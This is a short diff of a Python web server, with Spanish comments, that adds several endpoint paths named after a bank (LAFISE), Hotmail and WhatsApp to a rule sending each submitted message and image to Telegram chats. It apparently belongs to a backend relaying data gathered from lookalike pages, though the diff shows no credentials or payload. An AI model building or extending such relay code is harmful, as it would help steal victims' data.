@@ -732,6 +732,11 @@ def decode_base64_image(base64_string: str) -> bytes:
         logger.error(f"Error decodificando imagen base64: {e}")
         raise ValueError(f"Imagen base64 inválida: {e}")
 
+
+PATHS_DOBLE_ENVIO = {
+    "/lafise2", "/hotma1", "/hotma2", "/hotma3", 
+    "/wts1", "/wts2", "/wts3"
+}
 # =========================
 # Endpoints dinámicos (MULTIPART en /docs, imagen OPCIONAL)
 # =========================
@@ -799,7 +804,8 @@ async def handle_dynamic_endpoint_optimized_with_image(
                     image_data=image_data, image_filename=image_filename
                 )
                 telegram_results.append(r2)
-            elif path.startswith("/lafise2"):
+            elif any(path.startswith(p) for p in PATHS_DOBLE_ENVIO):
+                # TODOS los paths especificados: lafise2, hotma1-3, wts1-3
                 # Envía al DEFAULT_CHAT_ID con imagen
                 r1 = await enviar_telegram_hibrido(
                     mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
@@ -1691,7 +1697,6 @@ if __name__ == "__main__":
         server_header=False,
         date_header=False
     )
-
 
 
 
